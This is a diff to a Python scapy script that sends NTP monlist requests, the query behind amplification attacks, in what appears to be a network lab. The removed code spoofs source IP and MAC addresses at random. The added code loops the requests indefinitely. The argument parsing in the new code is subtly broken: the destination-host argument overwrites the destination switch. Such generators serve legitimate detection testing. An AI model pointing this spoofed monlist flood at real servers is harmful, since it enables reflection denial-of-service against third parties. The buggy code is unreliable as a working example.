@@ -1,22 +1,9 @@
 #!/usr/bin/python
 
-# Copyright 2013-present Barefoot Networks, Inc.
-#
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-#    http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
-
 from scapy.all import Ether, IP, sendp, get_if_hwaddr, get_if_list, TCP, Raw, UDP, NTP, fuzz
 import sys
-import random, string
+import time
+import string
 import socket
 import fcntl
 import struct
@@ -57,83 +44,46 @@ def read_topo():
             links.append( (a, b) )
     return int(nb_hosts), int(nb_switches), links
 
-def send_random_traffic(dst, num_requests):
-    NTP_MONLIST_REQUEST = "\x17\x00\x03\x2a" + "\x00" * 4
-    #NTP_MONLIST_RESPONSE = "\xd7\x00\x03\x2a" + "\x00\x01\x00\x48" + "\x00" * 72
-    dst_mac = None
-    src_ip = None
-    dst_ip = None
-    legitimate_pkts = 0
-    spoofed_pkts = 0
-    total_pkts = 0
+def send_random_traffic(src_switch, src_host, dst_switch, dst_host, timeout, loop):
+    NTP_MONLIST_REQUEST = "\x17\x00\x03\x2a" + "\x00" * 8
 
-    # List used to get a random IP source
-    ips_list = ['10.0.1.1','10.0.1.2','10.0.1.3']
+    src_mac = '00:00:00:00:0' + src_switch + ':0' + src_host
+    src_ip  = '10.0.' + src_switch + '.' + src_host
+    dst_mac = '00:00:00:00:0' + dst_switch + ':0' + dst_host
+    dst_ip  = '10.0.' + dst_switch + '.' + dst_host
 
-    # Map IP to respective mac
-    # This is needed when trying to send spoofed packet
-    # We must match IP source with MAC source.
-    mac_addresses = { '10.0.1.1' : "00:00:00:00:01:01",
-                      '10.0.1.2' : "00:00:00:00:01:02",
-                      '10.0.1.3' : "00:00:00:00:01:03" }
     # Get name of eth0 interface
     iface_eth0 = ''
     for i in get_if_list():
         if 'eth0' in i or 's0' in i:
             iface_eth0 = i
-    mac_iface_eth0 = get_if_hwaddr(iface_eth0)
-    ip_addr_eth0 = get_ip_address(iface_eth0)
 
-    if len(mac_iface_eth0) < 1:
-        print ("No interface for output")
-        sys.exit(1)
-
-    if dst == 'h1':
-        dst_mac = "00:00:00:00:01:01"
-        dst_ip = "10.0.1.1"
-    elif dst == 'h2':
-        dst_mac = "00:00:00:00:01:02"
-        dst_ip = "10.0.1.2"
-    elif dst == 'h3':
-        dst_mac = "00:00:00:00:01:03"
-        dst_ip = "10.0.1.3"
-    else:
-        print ("Invalid host to send to")
-        sys.exit(1)
-
-    N = int(num_requests)
-    for i in range(N):
-        # Choose random source IP
-        random_number = random.randint(0,2)
-        src_ip = ips_list[random_number]
-        # Legitimate packet.
-        # Increment counter and set source mac
-        if src_ip == ip_addr_eth0:
-            legitimate_pkts += 1
-            src_mac = mac_iface_eth0
-        # Spoofed packet
-        # Match source IP with correspondent mac address
-        else:
-            src_mac = mac_addresses[src_ip]
-            spoofed_pkts += 1
-        port = random.randint(1024, 65535)
+    while True:
         p = Ether(dst=dst_mac,src=src_mac)/IP(dst=dst_ip,src=src_ip)
-        p = p/UDP(dport=123,sport=port)/NTP(NTP_MONLIST_REQUEST)
-        print p.show()
-        sendp(p, iface = iface_eth0, loop=0)
-        total_pkts += 1
-
-    print ''
-    print "Sent %s legitimate packets" % legitimate_pkts
-    print "Sent %s spoofed packets" % spoofed_pkts
-    print "Sent %s packets in total" % total_pkts
+        p = p/UDP(dport=123,sport=123)/Raw(NTP_MONLIST_REQUEST)
+        sendp(p, iface = iface_eth0, loop=loop, verbose=0)
+        time.sleep(timeout)
 
 if __name__ == '__main__':
-
-    if len(sys.argv) < 2:
-        print("Usage: python send.py dst_host_name num_requests")
+    if len(sys.argv) < 6:
+        print("Usage: python send.py src_switch src_host dst_switch dst_host time [loop]<0|1>")
         sys.exit(1)
     else:
-        dst_name = sys.argv[1]
-        num_requests = sys.argv[2]
-        send_random_traffic(dst_name, num_requests)
+        src_switch = sys.argv[1]
+        if 's' in src_switch:
+            src_switch = sys.argv[1].split('s')[1]
+        src_host = sys.argv[2]
+        if 'h' in src_host:
+            src_host = sys.argv[2].split('h')[1]
+        dst_switch = sys.argv[3]
+        if 's' in dst_switch:
+            dst_switch = sys.argv[3].split('s')[1]
+        dst_host = sys.argv[4]
+        if 'h' in dst_host:
+            dst_switch = sys.argv[4].split('h')[1]
+        timeout = float(sys.argv[5])
+        loop = 1
+        if len(sys.argv) > 6:
+            loop = int(sys.argv[6])
+
+        send_random_traffic(src_switch, src_host, dst_switch, dst_host, timeout, loop)
